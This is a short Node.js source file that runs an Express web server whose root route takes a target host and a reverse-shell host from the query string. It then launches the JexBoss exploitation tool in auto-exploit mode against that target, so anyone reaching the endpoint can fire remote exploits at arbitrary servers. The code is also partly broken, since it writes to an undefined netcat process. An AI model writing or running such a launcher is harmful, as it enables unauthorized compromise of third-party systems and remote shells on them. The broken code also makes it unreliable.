


const { spawn } = require('child_process');
var os = require('os');
var ip = require('ip');

function hack(host,reverseHost) {
    console.log( ['-vv', '-l', reverseHost.split(':')[1]])
 


    const jexboss = spawn('python', ['./egg/jexboss.py', '--auto-exploit', '-host', host,
        '--reverse-host', reverseHost]);

    jexboss.stdout.on('data', (data) => {
        console.log(`jexboss stdout: ${data}`);
        if (data.indexOf('Type [ENTER] to continue...') > -1) {
            nc.stdin.write('\n');
        }
    });

    jexboss.stderr.on('data', (data) => {
        console.log(`jexboss stderr: ${data}`);
    });

    jexboss.on('close', (code) => {
        console.log(`jexboss child process exited with code ${code}`);
    });

}

var express = require('express');
var app = express();

app.get('/', function (req, res) {
  hack(req.query.host,req.query.reverse)
  res.send('ok');
});

var server = app.listen(3000, function () {
  var host =ip.address();
  var port = server.address().port;

  console.log('jexboss server app listening at http://%s:%s', host, port);
});